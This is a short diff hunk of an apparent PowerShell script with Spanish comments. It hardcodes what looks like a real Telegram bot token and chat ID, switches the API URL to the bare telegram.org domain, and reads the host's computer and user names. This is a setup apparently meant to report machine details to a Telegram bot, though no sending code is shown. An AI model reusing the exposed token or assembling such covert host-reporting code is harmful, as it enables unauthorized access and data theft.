@@ -5,7 +5,7 @@ $Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # Tu TOKEN real compl
 $ChatID = "1018796719"                                    # Tu ChatID numérico real aquí
 
 
-$URL    = "https://api.telegram.org"
+$URL    = "https://telegram.org"
 
 $MiPC   = $env:COMPUTERNAME
 $User   = $env:USERNAME
